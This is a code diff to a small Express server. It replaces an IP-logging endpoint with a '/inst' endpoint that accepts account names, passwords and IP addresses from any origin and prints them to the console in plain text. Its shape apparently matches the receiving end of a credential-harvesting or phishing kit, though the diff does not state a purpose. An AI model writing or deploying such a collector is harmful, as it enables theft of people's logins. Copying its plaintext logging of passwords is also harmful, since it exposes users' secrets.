@@ -1,5 +1,4 @@
 const express = require('express');
-const bodyParser = require('body-parser');
 const cors = require('cors');
 
 const app = express();
@@ -7,13 +6,18 @@ const PORT = 3000;
 
 // Middleware
 app.use(cors());
-app.use(bodyParser.json());
+app.use(express.json());
 
-// Endpoint to receive the IP address
-app.post('/api/ip', (req, res) => {
-    const { ipAddress } = req.body.ip;
-    console.log('Received IP Address:', ipAddress);
-    res.json({ message: 'IP Address received successfully!' });
+// Endpoint to receive the data
+app.post('/inst', (req, res) => {
+    const { acc, pass, ip } = req.body;
+
+    if (!acc || !pass || !ip) {
+        return res.status(400).json({ error: 'Missing account, password, or IP address in request body.' });
+    }
+
+    console.log('Account:', acc, 'Password:', pass, 'IP Address:', ip);
+    res.status(200).json({ message: 'Data received successfully.' });
 });
 
 // Start the server
